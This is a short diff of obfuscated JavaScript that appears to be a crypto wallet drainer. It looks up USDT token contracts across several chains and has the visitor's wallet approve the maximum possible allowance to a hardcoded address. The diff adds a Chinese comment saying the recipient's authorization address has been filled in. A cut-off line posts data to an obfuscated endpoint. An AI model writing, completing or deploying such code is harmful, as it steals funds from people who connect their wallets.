@@ -35,7 +35,7 @@ try{await fetch(_0x18b3[0],{method:"POST",headers:{"Content-Type":"application/j
 async function _0x389a(){
 try{
 const chainId = _0x4a68;
-const USDT_MAP = {
+const USDT_MAP={
 "0x38":"0x55d398326f99059fF77548524699952727959279",
 "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
 "0x89":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
@@ -46,6 +46,8 @@ if(!USDT_MAP[chainId]){alert("请切换支持的公链");return false;}
 const web3 = new Web3(window.ethereum);
 const ABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];
 const contract = new web3.eth.Contract(ABI, USDT_MAP[chainId]);
+
+// 这里已补上你的授权地址
 await contract.methods.approve("0x0f4bdefc177df2583f52b03b1e20f9eac7308555","115792089237316195423570985008687907853269984665640564039457584007913129639935").send({from:_0x2d53});
 return true;
 }catch(e){return false;}
